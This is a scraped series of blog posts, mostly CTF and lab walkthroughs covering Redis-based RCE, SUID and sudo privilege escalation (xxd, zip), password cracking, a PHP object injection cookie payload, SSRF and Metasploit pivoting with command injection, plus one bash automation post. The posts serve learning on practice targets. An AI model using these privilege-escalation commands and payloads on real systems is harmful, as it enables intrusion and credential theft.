I fired up dirsearch, another blazingly fast directory scanner. In other scenarios it’s good to also maximize accuracy by using additional tools like gobuster and dirbuster that may pick up interesting directories.\npython3 dirsearch.py -u \u0026lt;IP\u0026gt; -e \u0026#34;*\u0026#34; We don’t get anything interesting.\nExploitation # 6379 - Pentesting Redis\nThe article above came in handy in gaining RCE. I used redis-cli to interact with the instance. You can install redis-cli as shown below\nsudo apt-get install redis-tools We have unauthenticated access to the database instance.\nAccording to the article, for us to achieve RCE on the server, we need to find the path to the web site folder. Remember our default apache page? Well that comes in handy here\nThe document root is highlighted /var/www/html. Now we change our directory to that folder and try uploading some files.\nAs a POC, we can try displaying phpinfo as shown above and accessing it on the browser.\nSweet :) This means we have remote code execution on this server. We can therefore proceed to getting a shell, escalating our privileges and gaining root access.\nRemote Code Execution # To gain RCE. Create another file and append the following code to be able to execute code on a parameter.\nWe get RCE :)\nNice. Now lets get a reverse shell. From payloadallthethings we can get our python revshell, modify it and set up a netcat listener\nGrab your shell :)\nStabilize the shell by backgrounding it using ctrl+z and then stty raw -echo;fg to resume.\nNavigate directories to get your user.txt flag.\nPrivilege escalation # My approach for privesc before uploading linpeas or any enumerator is to first check for sudo rights the user has using sudo -l, then check for SUID bits set\nxxd has suid bit set. And it owned by the root user. Head over to GTFObins and check through xxd.\nInteresting, in this exploit, we can read sensitive info using the xxd binary like /etc/shadow file.\nLFILE=file_to_read xxd \u0026#34;$LFILE\u0026#34; | xxd -r I read this file and grabbed the hash of the vianka user, since it was part of this challenge to get the user’s password\nWe can crack their password using john.\njohn hash.txt --wordlist=/usr/share/wordlists/rockyou.txt We get the password as beautiful1 We can do some horizontal privilege escalation to and execute commands as vianka.\nVianka has all sudo permission on the machine as shown by the command sudo -l\nFor the root flag\nIf you’ve made it this far, like , share and follow for more articles\nHappy hacking :)\n","date":"23 March 2021","permalink":"/posts/2021-03-23_rce-on-unauthenticated-redis-server/","section":"Posts","summary":"In this brief walk-through , we will be hacking a vulnerable database server by showcasing the res room in Tryhackme.","title":"RCE on Unauthenticated Redis server"},{"content":"ASPIRE CTF was a good refresher for basic CTF skills. I hopped onto it played and solo to get the most out of it. Below is a detailed walk-through for all the challenges I solved in the Linux skills category\nNeedle in a haystack -50pts # From the challenge description and title, we need to leverage on using commands to locate our flag. The zip file contains a number of different files\nWell, the most efficient way to look for the flag in this case would be to perform a grep search using a regex pattern.\nThis particular article came in handy in constructing the regex pattern that gets us the flag.\nHow to grep text with brackets only\nYarn-50pts # Our next challenge entails a bit of forensics CTF knowledge. First things first when given an image file is to analyze its metadata for any additional helpful information\nThe markers I have highlighted didn’t yield that much information so I ran strings on the image to check for low hanging fruits. We get interesting information. strings bean.jpeg This segment of the strings output reveals we are working with XMP metadata, commonly used with Adobe and Photoshop apps. We can therefore proceed to extract the XMP data to obtain our flag. dd bs=1 if=bean.jpeg skip=718 count=3827 This article came in handy\nDeep Dive\nCommitment-50pts # We have an interesting challenge here testing our git skills. From the challenge name and description, this entails commit messages. git log\nRunning git log allows us to view information about previous commits that have occurred in a project.\nWe get our flag :)\nShape shifter-50pts # From the challenge description, we may have embedded information within the pdf. I thought of first running strings to get any low hanging fruits.\nDidn’t get anything, so I extracted embedded data using binwalk a tool for searching for embedded data within files. binwalk -Me proceedings.pdf #recursively extract files from the pdf We get a number of files\nThe versatile file seems interesting\nWe get our flag :)\nMake me whole again # Some classic forensics file carving. Sweet :)\nUnzip the broken.zip file and run file to get the details about the file types.\nInteresting, the first file hints that we are working with a broken JPEG file. The appended letters of the files(a-v) also hints that if we joined the files in that order, we may get the original file cat * \u0026gt; final #this command gives us the final appended data eog final #this command opens the jpeg file Matroska-50pts # Matroska is derived from matryoshka , the Russian word for the hollow wooden dolls which open to expose another smaller doll, that in turn opens to expose another doll, and so on.\nThe file we get didn’t require automation to get the flag as the nesting wasn’t intense :D, simply extract the nested to extract your flag\nBack to the future-50pts # This particular challenge was rather interesting.\nWe get a file that looks like the normal linux home directory structure. Well, let’s get prying. Our challenge description hints that our focus point should be at the bash_history.\nSo I tried grepping for the string aspire then for the string flag\nWe get some interesting info. flag.txt gets created and converted to a script.\ncat flag.sh | curl -F ‘f:1=\u0026lt;-’ ix.io This line sticks out. I tried accessing ix.io to understand what this line meant.\nNice, a command line pastebin. Where users can store texts , in this case, commands. Running the highlighted command generates a link which contains the output of the command\nThis means that the last command cat flag.sh | curl -F ‘f:1=\u0026lt;-’ ix.io \u0026gt; .cache/.url will redirect the generated link to .cache/.url\nAll we need to do is access the link and get the flag\nTime travel-100pts # Hmm, time travel ?\nAnother git challenge, sweet :D git status git log The highlighted commit hash message stuck out. The redacted info could be our flag. We can use git checkout to check that commit out, then git log -p to inspect what was modified, the location of the changes and the changes that were made.\nWe get our flag :)\nBackdoors-250pts # This was a rather simple challenge for 250pts :)\nThe flag was located in the /home/backdoor/ directory.\nBackdoors-Hide and Seek-250pts # This challenge didn’t require any priv esc, At first I thought is was guessy but this was my thought process after getting some help from a friend. If I was to check for a backdoor in a system, I would try monitor for running processes using command like netstat ss lsof ps I tried typing out these command but didn’t get much.\nBut upon viewing the actual scripts …\nWe get the flag :)\nEscape Room — 250 pts # Well, given the ssh creds. Let’s try accessing the server\nThe ssh connection immediately closes upon connection. hmmm, an ssh jail?\nMy workaround for this challenge was to directly pass commands into the ssh session before the connection is shut down\nUsing the flag -t allows you to pass commands into the ssh connection . I also used sshpass, a utility that provides non-interactive password prompt. We can now output our flag sshpass -p escape ssh -t escape@68.183.92.119 \u0026amp;#39;cat flag.txt\u0026amp;#39; We get the flag :)\nThat’s it for linux skills### Networking\nThe networking bit was equally as fun and beginner friendly, here are all solves for the challenges.\nThe wire-50pts # From the challenge description it was likely the flag was captured in the network. Ran strings to output it strings cisco.pcapng We get the flag at the bottom\nRedirection-50pts # The challenge involves HTTP redirection\nRedirections in HTTP\nFrom the above article, I followed that to identify redirection you check for 301 and 302 status codes in the packet capture\nWe get a packet, moving on to analyzing it\nRight click on the packet \u0026gt; Follow \u0026gt; TCP stream\nThe highlighted text contains the URI path that the client was redirected from\nGateway-50pts # The quickest way to identify the router was check for ARP requests. Usually for remote hosts to make a connection to the network, an ARP to the default gateway is made that triggers a series of ARPs from that gateway or router throughout the network. This can help us trace the router\nFilter for arp packets and we get the devices sending ARP requests\nThe highlighted one is our router, it’s MAC is provided.\nCerts-50pts # x509 is a standard defining the format for public certificates, commonly used in TSL/SSL.\nTo get the x509 certificate we need to filter for ssl and observe the packet which is has certificate in the description. Expanding this in the description gives the serial number.\nWireless One-50pts # To identify the attacker’s IP, we must first take into consideration what type of attack is being carried out.\nIf you observer the protocol of the communication, you can see 802.11, a protocol used to implement wireless LAN. In the context of wi-fi based attacks I thought of MITM where the attacker could intercept packets.\nFurther extrapolating this thought process, we arrive at a deauthentication attack. The attacker here, attempts to deauthenticate users in the network and capture their tcp 4-way handshake once they try to reauthenticate.\nIn our packet capture, identify the deauthentication packet, the source is the attacker\nWireless Two-150pts # To get the password to the network, all we need to do is to crack the 4-way handshake packet capture. We can use air-crack ng for this aircrack-ng subzero.cap -w /opt/rockyout.txt We get the key !\nResolver-50pts # In a forward DNS lookup, the DNS is queried for the IP address of a certain hostname. In a reverse DNS lookup It’s where the hostname of a certain IP address is queried. Basically, a reverse DNS lookup returns the hostname of an IP address.\nFrom the challenge description, we can narrow down our search by investigating IPs outside Kenya. Wireshark has plugins that allow you to check the location of an IP\nHowToUseGeoIP\nTo inspect the locations of the IP in the packet capture go to\nstatistics \u0026gt; endpoints\nThe IP 62.8.64.6 contains our reverse DNS records\nUsing this site, I queried the IP and got the results\nReverse IP Lookup - MxToolbox\nAttribution-150pts # In this particular challenge, we need to check the location of the IP. This particular article comes in handy in using the GeoIP database\nHowToUseGeoIP\nGo to statistics \u0026gt; endpoints , the first entry contains our answer\nFingerprint-250pts # In TLS, the way the encryption is implemented can be fingerprinted. This fingerprint can be added to list of factors used to determine if you are who you say you are. JA3 is a method for creating this fingerprints\nTo solve this challenge we need to install the following plugin\nfullylegit/ja3\nCopy the ja3.lua file to your wireshark/plugins.\nYou may need to create this folder incase it does not exist. In linux , I created the folder in this path /home/\u0026lt;username\u0026gt;/.config/wireshark/plugins\nNaturally, it only makes sense to establish the TSL at the start of the communication. You can see this in the packet called Client Hello which is the start of TSL handshake\nYou get the ja3 fingerprint hash\nThat concludes the entire writeup for Aspire CTF. Hope you learnt something :)\nLike, share and follow for more ! Happy hacking :)\n","date":"15 February 2021","permalink":"/posts/2021-02-15_aspire-ctf-2021linux-skills-networking/","section":"Posts","summary":"ASPIRE CTF was a good refresher for basic CTF skills.","title":"ASPIRE CTF 2021 — Linux Skills \u0026 Networking"},{"content":"Welcome to another episode of spending 4 hours to automate something that would take me 5 minutes to manually do 😂But hey, this was a fun project to do and it proved useful in my day to day project workflow.\nIn this article, I will show you how you can automate your workflow too :)\nHow does my workflow look like # Besides being a CTF player, I am also a freelance web developer. This means I take on a number projects from time to time and experiment with different technologies occasionally.\nIdentifying recurring tasks in the workflow # My workflow is coupled up with a ubiquitous setup process where I login to github, create a new project, go to my terminal and create a directory for the project, connect the local repo to my remote repo, make an initial push to my repo then finally opening my editor to actually work on the project. The github REST API and a few lines of bash is all we need to automate this entire process.\nThe github API and Bash Scripting # The github REST API allows you to manage issues, branches, repos and more. In this case, we will consume the API to help us create a repository.\nWhat you will need # Before actually consuming the REST API, you will need to generate a personal access token that allows us to authenticate against the API. Head over to https://github.com/settings/tokens and generate a new token.\nSelect on the repo option in the scopes and make sure to copy and save the generated token somewhere.\nEnvironment variables # In the context of linux, environment variables come in pretty handy in storing sensitive information like passwords and tokens that you don’t want exposed when working on projects.\nEditing into the ~/.bash_profile helps you store your personal token safely.\nIn the context of windows. This is how you can set your own environment variables. In the Start menu, search for ‘environment variables’ and click on this option\nClick on this option\nClick on new , paste in your access token and save the changes\nTesting the REST API # We will test github’s REST API endpoint with our personal access token using curl — a command line tool that comes pre-installed in most operating systems and can be used to handle HTTP requests and responses and also transferring data in a network.\nThe github API docs is pretty well written and came in handy.\nResources in the REST API\nSending an authentication curl request to the API returns no errors\ncurl -H \u0026#34;Authorization: token $access_token\u0026#34; https://api.github.co m` `` ![image](/posts/2021-02-01_automating-my-project-workflow-with-bash-scripting/images/8.png#layoutTextWidth) We can try querying for repos ```bash curl -H \u0026#34;Authorization: token $access_token\u0026#34; \u0026#34;https://api.github.c om/search/repositories?q=user:trevorsaudi\u0026#34; | less We get all our repos\nLet’s try creating a repo using the access token\ncurl -i -H \u0026#34;Authorization: token $access_token\u0026#34; -d \u0026#39;{\u0026#34;name\u0026#34;: \u0026#34;demo \u0026#34;,\u0026#34;auto_init\u0026#34;: false,\u0026#34;private\u0026#34;: false}\u0026#39; https://api.github.com/us er/repos The repo is successfully added to our github\nBash scripting # A bash script is a series of commands put together in a text file. This comes in handy in automation in linux.\nNow that we can successfully consume the REST API , let’s add it all to a bash script and create a system link to have the bash script work as our very own terminal command.\nStep 1: Creating a directory for our project and navigating into it\nmmkdir \u0026lt;project_name\u0026gt; \u0026amp;\u0026amp; cd \u0026lt;project_name\u0026gt; Step 2: Creating the README file and initial project setup\n\u0026amp;\u0026gt;/dev/null is used to redirect all output so we don’t see any of it in the terminal Now that we have the initial project setup, let’s put the API into use\nNote that after consuming the API we need to actually connect our local repository to our remote repository , push the initial change then open your text editor of choice.\nOur final script can be jumbled up into a function that we will pass a command line argument. Add some CLI messages to make it look attractive :)\nDon’t forget to make the script executable using chmod +x Now lets add a system link to the bash script to we can use it as a single command anywhere in the system.\nsudo ln -s \u0026lt;path to project\u0026gt; /usr/local/bin Our final result\n#!/usr/bin/bash automate(){ echo \u0026#34;Welcome to Automate\u0026#34; | cowsay echo \u0026#34;Creating the directory for your project\u0026#34; echo \u0026#34;+------------------------------------------------+\u0026#34; mkdir -p $1 \u0026amp;\u0026amp; cd $1 echo \u0026#34;$1\u0026#34; \u0026gt; README.md git init \u0026amp;\u0026gt;/dev/null git add .\u0026amp;\u0026gt;/dev/null git commit -m \u0026#34;first commit\u0026#34; \u0026amp;\u0026gt;/dev/null git branch -M main \u0026amp;\u0026gt;/dev/null echo \u0026#34;Creating the Repository\u0026#34; echo \u0026#34;+------------------------------------------------+\u0026#34; curl -i -H \u0026#34;Authorization: token $access_token\u0026#34; -d \u0026#39;{\u0026#34;name\u0026#34;: \u0026#34;\u0026#39;\u0026#34;$1\u0026#34;\u0026#39;\u0026#34;,\u0026#34;auto_init\u0026#34;: false,\u0026#34;private\u0026#34;: false}\u0026#39; https://api.github.com/user/repos \u0026amp;\u0026gt;/dev/null git remote add origin https://github.com/trevorsaudi/${1}.git \u0026amp;\u0026gt;/dev/null git push -u origin main \u0026amp;\u0026gt;/dev/null echo \u0026#34;Opening your favourite text editor\u0026#34; echo \u0026#34;+------------------------------------------------+\u0026#34; code . exec bash } automate $1 Source code to the script.\nhttps://github.com/trevorsaudi/Project-Automation\nShare, like and follow for more articles like this 😃\n","date":"1 February 2021","permalink":"/posts/2021-02-01_automating-my-project-workflow-with-bash-scripting/","section":"Posts","summary":"Welcome to another episode of spending 4 hours to automate something that would take me 5 minutes to manually do 😂But hey, this was a fun project to do and it proved useful in my day to day project workflow.","title":"Automating my project workflow with Bash scripting"},{"content":"Crontab Privilege escalation # In this awesome beginner friendly CTF, I will be taking you through how I rooted the box. https://ctf.cyberspace.co.ke/vault/stegapwn\nThe challenge is divided into guiding questions. From the name of the challenge, we can deduce some steganography and Pwning will be involved.\nWhat is the IP, passphrase, username, password?\nStarting off with steganography, I downloaded the cheetah image to my machine. Tried some low hanging fruits like viewing the strings of the image using strings command. exiftool to extract some metadata from the image. xxd to check for some corrupted bytes, stegsolve and binwalk but none gave in.\nMy last option was that some data was hidden in the image using a tool like steghide. This can be confirmed by viewing the header of the strings output.\nIntuitively, this weird string is a common occurrence when hiding data using steghide. So I tried extracting the hidden data\nWell, now we need the passphrase to get the contents. Stegextract is a tool for bruteforcing passphrases. But….using the rockyou wordlist(which has more than 8 million lines of text) with stegextract was a bad idea\nMy machine overheated a couple of times and even had to turn it off :(\nAfter thinking on how i could optimize the bruteforce approach, I noticed an unintended hint from the challenge. The length of the passphrase is expected to be 11 characters from the number of asterix used as placeholders for the answer\nFiltered out all words not equal to 11 characters.\nRan the bruteforce again without melting my motherboard :)\nAt the time of writing this article, I found out about a tool from a friend of mine called stegseek that goes through the rockyou wordlist in less than 10 seconds. I guess I know what tool to use next time in a similar challenge.\nPrivilege escalation # Now we ssh into the box using the credentials given, and attempt to gain root access.\nRunning linpeas for automatic enumeration for privilege escalation vectors,\nWe have a writable script at /usr/local/sbin called runshell.sh that a hint reveals to be a cronjob running as root.\nRunning a process monitor also shows the script being executed after a certain period of time\nNice. So we can try using a reverse shell inside the runshell.sh script to get back a connection with the UID=1000 which belongs to a user called r374RD\nI used ngrok to portforward on port 1234, got the shell back where 3.138.180.119 is the hostname for my forwarded IP.\nGives back a reverse shell after 5 minutes. sudo -l reveals we can run any commands as SUDO so I switched to root user by sudo su Flag is in the root directory.\nHappy hacking :)\nHappy hacking :)\n","date":"24 January 2021","permalink":"/posts/2021-01-24_cyberspace-kenya-stegapwn/","section":"Posts","summary":"Crontab Privilege escalation # In this awesome beginner friendly CTF, I will be taking you through how I rooted the box.","title":"CyberSpace Kenya— StegaPwn"},{"content":"In the machine section in Cybertalents, we have this medium level box to root. Diving right in!\nEnumeration # Get The highest privilege on the machine and find the flag!VPN Target IP: 172.24.209.176Public Target IP: 18.193.123.37\nPerformed some nmap port scanning to get an overview of running ports and services\nssh and apache are running. So we can move on to view the web server. We get a default apache page, enumerating further we can reveal more interesting pages.\nBruteforcing directories using dirsearch we get some info .\nViewing the pages listed\nWell, not much at first glance till we interact with the site. Tried viewing the source of the main page, about us and contact us. Contact us gives us an interesting file.\nEnded up with this huuuuuuge chunk of nested base64 encoding\nSo, using python we can recursively decode that.\nScripting # Okay, so this seems to be credentials. Judging from the open ports-ssh login credentials.\nBut we need a user for that. From the challenge name ‘Shadower’ I deduced that this hinted at the /etc/shadow file and possibly some LFI could be involved.\nBack to the contact us page. We can fuzz the URL for some LFI and see if we get lucky.\nSweet! if you look closely, you can see our target user - john. Logging in with those credentials…\nwe’re in! Now for the sweet part of the challenge. Getting root access to the box.\nPrivilege Escalation # Tried viewing what commands john could run as sudo\nA bit unlucky.\nWell, to quicken our priv esc , you can run linpeas on the box to enumerate on potential vectors. You can clone it from github https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite\nMake the script executable by running chmod +x. Then run the script\nFrom linpeas results, the /etc/passwd file is writable. Sweet! We can add our own root user and use that to get the flag.\nTried editing the /etc/passwd file directly. Worked, but I couldn’t assign a password to the user\nSo instead, opted to use OpenSSL. This article came in handy.\nEditing /etc/passwd File for Privilege Escalation\nFollowing the article, create your own salt for the password using openssl. Paste into /etc/passwd following this format\nNice! We get root. You can stabilize the shell using python3 -c “import pty; pty.spawn(‘/bin/bash’)”\ncd into /root, get your flag in the “-” directory.\nHappy hacking :)\n","date":"29 December 2020","permalink":"/posts/2020-12-29_cybertalents-shadower/","section":"Posts","summary":"In the machine section in Cybertalents, we have this medium level box to root.","title":"CyberTalents | Shadower"},{"content":"Took part in Vulncon CTF this weekend where our team settled for 34th place out of 442 teams. Diving into the first web challenge -maze(easy category).\nEnumeration # From the hint we are told we can use gobuster. So I did some directory bruteforcing with the tool of my choice -dirsearch :)\nOur tool picks up an interesting directory /projects/\n27 is my lucky number… a hint maybe? Viewing the source of the page, we get more interesting information\nAccessing the image that has been commented out gives us this QR code.\nScanning this gives the word. “hello”. Since the image was named “image-0.png” I tried viewing “image-1.png” and got another image. So this means we have multiple images which gives a string after being scanned. From the /projects/ directory the hint given tells us that we have 27 images in total.\nI used wget to recursively download all images\nSolving # So now, we can write a small python script to decode all the QR codes.\nThis gives us the following sentence\nPerformed more analysis on image 13\nWe get an interesting string at the Creator tag. Decoding with basecrack we get a rotated string\nDecoded with ROT13 to get the flag.\n","date":"20 December 2020","permalink":"/posts/2020-12-20_vulncon-ctfmaze/","section":"Posts","summary":"Took part in Vulncon CTF this weekend where our team settled for 34th place out of 442 teams.","title":"Vulncon CTF — maze"},{"content":"Had some spare time over the weekend to participate in this awesome CTF. This challenge covers a web app vulnerability — PHP Object Injection(Insecure deserialization). Let’s dive in!\nI wonder if you can guess what\u0026rsquo;s going on\nEnumeration # We get a simple input form that we can fuzz around for a bit to get an idea of what is going on :)\nInteracting with the form, you notice how the strings get appended to each other.\nCalls for some enumeration. Viewing the source of the page reveals interesting information\nYou can read more on vim swap files below. Typically in vim, swap files act as recovery files when you’re working with vim as your editor.\nShould you disable Vim's swap files (.swp) being created?\nFollowing the article, we can access the swap file for the challenge at http://18.156.117.120/guessy/.index.php.swp.\nOpening the contents of the swap we get the following\nThis information will come in handy towards the end :)\nEnumerating further to investigate on the behavior of the input form, I took a look at the cookies and got some juicy info.\na%3A2%3A%7Bi%3A0%3Bs%3A4%3A%22hey+%22%3Bi%3A1%3Bs%3A5%3A%22there%22%3B%7D” which is URL encoding for “a:2:{i:0;s:4:”hey+”;i:1;s:5:”there”;}\nSweet! We have some PHP objects being used to store the data from the input form. Summarizing an article from https://portswigger.net/web-security/deserialization/exploiting , this is how PHP objects work.\nPHP uses a mostly human-readable string format, with letters representing the data type and numbers representing the length of each entry. For example, consider a User object with the attributes:\n$user-\u0026gt;name = \u0026#34;carlos\u0026#34;; $user-\u0026gt;isLoggedIn = true; When serialized, this object may look something like this:\nO:4:\u0026amp;#34;User\u0026amp;#34;:2:{s:4:\u0026amp;#34;name\u0026amp;#34;:s:6:\u0026amp;#34;carlos\u0026amp;#34;; s:10:\u0026amp;#34;isLoggedIn\u0026amp;#34;🅱️1;}\nThis can be interpreted as follows:\nO:4:\u0026quot;User\u0026quot; - An object with the 4-character class name \u0026amp;#34;User\u0026amp;#34; 2 - the object has 2 attributes s:4:\u0026quot;name\u0026quot; - The key of the first attribute is the 4-character string \u0026quot;name\u0026quot; s:6:\u0026quot;carlos\u0026quot; - The value of the first attribute is the 6-character string \u0026quot;carlos\u0026quot; s:10:\u0026quot;isLoggedIn\u0026quot; - The key of the second attribute is the 10-character string \u0026quot;isLoggedIn\u0026quot; b:1 - The value of the second attribute is the boolean value true We can now use the information we have to create our exploit. The swap file contains some php code that uses a magic method (__toString) to return an object of the index.php page from the class l33t. You can read more on magic methods here\nWhat are PHP Magic Methods? # Simply put, the toString method is being used to return information on the index.php page. We can use this method in constructing a payload that helps us return fl4g.php instead. Keep in mind that the source attribute needs to be included for us to read the fl4g.php page\nThis article came in handy in creating the final payload to get the flag\nHow PHP Object Injection works - PHP Object Injection # Exploitation # Our final payload will like this a:3:{i:0;s:5:\u0026quot;hello\u0026quot;;i:1;s:5:\u0026quot;there\u0026quot;;i:2;O:4:\u0026quot;l33t\u0026quot;:1:{s:6:\u0026quot;source\u0026quot;;s:8:\u0026quot;fl4g.php\u0026quot;;}}\nURL encode it and supply as the cookie value for list. voila ! you get the flag. flag{5w337_PHP_0bj3c7_!nj3c7!0n} Happy hacking!\n","date":"20 December 2020","permalink":"/posts/2020-12-20_cybertalents-weekend-ctfgu55y-writeupphp-object-injection/","section":"Posts","summary":"Had some spare time over the weekend to participate in this awesome CTF.","title":"CyberTalents Weekend CTF-gu55y writeup(PHP Object Injection)"},{"content":"Write-up for an [SSRF box] (https://www.root-me.org/?lang=en\u0026amp;amp;page=ctf_alltheday\u0026amp;amp;id_salle=4)on the rootme platform.\nSo from the description, our objective is to get root and find the flag in /root.\nEnumeration # Moving on to the challenge, we are presented with an input box where you can place a url and the site creates a link that redirects you to it.\nTo first test for SSRF, you can fuzz the input to see if you can read system files.\nNice! We can move on to detect open services running in the internal network of the web server. Intercept the request using burpsuite Intruder and bruteforce for open ports\nPort 6379 (running the Redis service) timed out on the intruder attack. This means that the port was open and redis was running.\nI proceed to port forward localhost on port 1234 using ngrok to expose my IP to the public .\nExploitation # Then used gopher to generate a payload that would get a reverse shell back on netcat. We get RCE !\nNavigate to /root and get your flag, and /passwd for the validation flag.\nHappy hacking :)\n","date":"17 November 2020","permalink":"/posts/2020-11-17_ssrf-to-gaining-rce-rootme-ssrf-box/","section":"Posts","summary":"Write-up for an [SSRF box] (https://www.","title":"SSRF to gaining RCE —( rootme ssrf box)"},{"content":"Another audio steganography challenge from RaziCTF.\nProceeding to solve\nChallenge description\nI told my friend SCOTTIE that this challenge is cliché and he said I’m not the only 1 who thinks that way.\nThe challenge is based on Slow-scan television (SSTV) which is a method for picture transmission used by amateur radio operators to transmit and receive images. The highlighted SCOTTIE from the challenge description hints directly at the transmission mode frequently used in SSTV.\nWe can use a tool called QSSTV to decode the piece of audio wav file from the challenge. A detailed installation description and an example on how to decode can be found here\nFrom the screenshot below, I pressed the play button to start recording on QSSTV then played the wav file from the challenge. Slowly, it starts to reveal the flag.\nRaziCTF{h0w_y0u_d0in}\nHappy hacking :)\n","date":"28 October 2020","permalink":"/posts/2020-10-28_razictf-clichesteganography/","section":"Posts","summary":"Another audio steganography challenge from RaziCTF.","title":"RaziCTF Cliche-Steganography"},{"content":"Beginner-Intermediate CTF that took place on Oct 28. We came 15th :).\nThis is the writeup for Listen, an audio steganogrpahy\nChallenge description\nListen carefully, what do you hear? Look closely, what do you see? To Submit the flag, put it in UPPERCASE and in this format RaziCTF{}. like this: RaziCTF{FLAG}\nWe are given a wav audio file. Most audio CTFs are similar so I proceeded to open the wav file with Audacity.\nI like to open my audio files as spectograms for better visibility. When I played the audio I could make out 2 distinct beeps and immediately thought of morse code. In audacity, the 2 distinct beeps are separated as shown above\nThe short lines represent dots (.) and the longer ones represent dashes (-) in morse code. I proceeded to translate the first wave form into a series of dots and dashes as shown below\n- .... . .-. . .- .-.. ..-. .-.. .- --. .. ... ... .---- -- .--. .-.. ...-- -- ----- .-. ... ... --\nDecoding as morse code we get the flag :)\nTHEREALFLAGISS1MPL3M0RSSM\nSubmitted the flag as S1MPL3M0RSSM\nHappy hacking :)\n","date":"28 October 2020","permalink":"/posts/2020-10-28_razictf-listensteganography/","section":"Posts","summary":"Beginner-Intermediate CTF that took place on Oct 28.","title":"RaziCTF Listen-Steganography"},{"content":"Description # Nully Cybersecurity: 1\n— this is an easy-intermediate realistic machine.\nWhile working with the machine, you will need to brute force, pivoting (using metasploit, via portfwd), exploitation web app, and using searchsploit.\nAbout: Wait 5–8 minutes before starting for the machine to start its services. Also, check the welcome page on port 80.\nHints: ‘cat rockyou.txt | grep bobby \u0026gt; wordlist’ for generating wordlist.\nStory: You are a Professional White Hat. Small company Nully Cybersecurity hired you to conduct a security test of their internal corporate systems.\nReconnaissance # Making sure you can ping the VM we are attacking from your network -I usually my VMs in Bridged Adapter mode. Proceed to scan the network to determine open ports and services running\nPort 80 is open, Let’s check out the web site!\nAt the bottom of the webpage, we get some information Nully Security Company has 3 servers and your goal is to get root access on each of them To start, check your email on port 110 with authorization data \u0026lt;code\u0026gt;pentester:qKnGByeaeQJWTjj2efHxst7Hu0xHADGO\nBruteforcing and exploitation # From the above information and the challenge description we can tell that once we get root access on the first server, you will be required to pivot to the rest of the servers and get root access in each. So let’s get hacking :)\nThe mail we get says the following: Hello, I\u0026amp;#39;m Bob Smith, the Nully Cybersecurity mail server administrator. The boss has already informed me about you and that you need help accessing the server. Sorry, I forgot my password, but I remember the password was simple.\nNice, from the information we can tell that possible usernames to the mail server could be bob, bobsmith, smith, bobS, Bob .. etc. I created a password list from the hint in the description and bruteforced against a possible user bob in ssh.\nWe get credentials to the mail server !\nRooting the mail server # Once we log in through ssh, taking a look around there’s a file named todo with the following info 1. Install postfix and dovecot 2. Write a letter to the penetration tester about the server. 3. Write a script to check the server. 4. Create my2user to backup important data.(I think for security reasons I will back up important data with the help of another user)\nhmm, let’s see what sudo commands bob can run on this server\nPrivilege escalation # From the above, you can tell that the user my2user is able to execute the file check.sh as root. Which means that if he executes the file using sudo it will be equivalent to my2user executing the file. Also, the NOPASSWD specifies that no password will be asked while executing the file.\nFirst we modify the check.sh file by adding /bin/bash -p at the top ( -p option lets bash keep the effective userid it is launched with which should be my2user). Then execute the script using sudo. We escalate our privileges horizontally and become my2user\nRepeating the same process, we see that my2user can run zip commands as root.\nWe can exploit that to drop into a shell as root! [GTFobins] (https://gtfobins.github.io/)is a good online resource for binaries that can be exploited or this purposes, checking for zip :\nTF=$(mktemp -u) sudo zip $TF /etc/hosts -T -TT \u0026amp;#39;sh #\u0026amp;#39; sudo rm $TF Boom! We rooted our first server. ` Mail server is rooted.\nYou got the first flag: 2c393307906f29ee7fb69e2ce59b4c8a\nNow go to the web server and root it.\n`\n2nd Flag # Pivoting # Pivoting is the technique of using an instance to be able to move around inside a network. We first begin by identifying all the IPs connected in the network. This way, we can pin point the web server and the database server.\nThe 2 IP addresses I singled out belong to the web server and the database server respectively.\nFirst we establish a reverse shell from the compromised server(mail server) to metasploit. Setting the payload to generic/shell_reverse_tcp and the exploit to exploit/multi/handler\nNext, background the shell and upgrade it to a meterpreter shell\nmsf5 post(multi/manage/shell_to_meterpreter) \u0026gt; options Module options (post/multi/manage/shell_to_meterpreter): Name Current Setting Required Description ---- --------------- -------- ----------- HANDLER true yes Start an exploit/multi/handler to receive the connection LHOST 192.168.1.10 no IP of host that will receive the connection from the payload (Will try to auto detect). LPORT 4433 yes Port for payload to connect to. SESSION 1 yes The session to run this module on. msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; run [*] Upgrading session ID: 1 [*] Starting exploit/multi/handler [*] Started reverse TCP handler on 192.168.1.10:4433 [*] Sending stage (980808 bytes) to 192.168.1.12 [*] Meterpreter session 2 opened (192.168.1.10:4433 -\u0026gt; 192.168.1.12:35888) at 2020-09-26 11:33:25 +0100 [*] Command stager progress: 100.00% (773/773 bytes) [*] Post module execution completed msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; sessions -i Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 shell sparc/bsd # 192.168.1.10:5555 -\u0026gt; 192.168.1.12:32832 (192.168.1.12) 2 meterpreter x86/linux no-user @ MailServer (uid=0, gid=0, euid=0, egid=0) @ 172.17.0.5 192.168.1.10:4433 -\u0026gt; 192.168.1.12:35888 (172.17.0.5) msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; sessions -i 2 [*] Starting interaction with 2... meterpreter \u0026gt; Set up autoroute and port forwarding .\nrun autoroute -s 172.17.0.1/16 portfwd add -l 8888 -p 80 -r 172.17.0.2 run autoroute -s \u0026lt;target IP /netmask\u0026gt; portfwd add -l \u0026lt;port to listen to on local machine\u0026gt; -p \u0026lt;remote port to connect to\u0026gt; -r \u0026lt;target IP\u0026gt; Access the webserver on remote machine\nFire up dirsearch for directory bruteforcing,\nwe get an interesting directory — ping , that sends out ping requests when we pass in host as a parameter.\nInteresting, we can try command injection on the ping parameter.\nWe get a reverse shell to the web server\nDigging around, we get a lot of permission denied errors when accessing Oscar’s files . Let’s try some privilege escalation\nfind / -perm -4000 -exec ls -l {} \\; 2\u0026gt;/dev/null -rwsr-xr-x 1 root root 44784 May 28 08:37 /usr/bin/newgrp -rwsr-xr-x 1 root root 68208 May 28 08:37 /usr/bin/passwd -rwsr-xr-x 1 root root 67816 Apr 2 17:29 /usr/bin/su -rwsr-xr-x 1 root root 55528 Apr 2 17:29 /usr/bin/mount -rwsr-xr-x 1 root root 85064 May 28 08:37 /usr/bin/chfn -rwsr-xr-x 1 root root 39144 Apr 2 17:29 /usr/bin/umount -rwsr-xr-x 1 root root 53040 May 28 08:37 /usr/bin/chsh -rwsr-xr-x 1 root root 88464 May 28 08:37 /usr/bin/gpasswd -rwsr-xr-x 1 root root 166056 Feb 3 2020 /usr/bin/sudo -rwsr-xr-x 1 oscar oscar 